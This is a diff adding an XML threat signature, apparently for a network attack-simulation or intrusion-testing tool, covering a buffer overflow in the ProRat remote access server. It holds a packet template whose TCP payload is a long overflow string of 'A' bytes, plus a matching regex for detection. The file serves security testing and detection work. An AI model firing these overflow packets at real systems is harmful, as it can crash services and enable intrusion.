@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="ProRat Buffer Overflow"/>
+    <EngDesc display="true" value="This attack causes a buffer overflow in the ProRat Remote Access tool.  ProRat is a remote access tool used by hackers to control victim computers.  This can flaw can allow another hacker to break in.  ProRat server typically listens on port 5110."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Unauthorized_Use"/>
+      <item value="Unauthorized_Access"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="Proprietary"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="http://www.milw0rm.com/id.php?id=1127"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value="14458"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="00000105d213a26700c000a80001003c48a2acd4"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632742200851875000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X30\X30\X30\X30\X30\X30\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41"/>
+    <Created value="1139462412" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="ProprietarydestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="G"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$ProprietarydestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="30303030303041414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
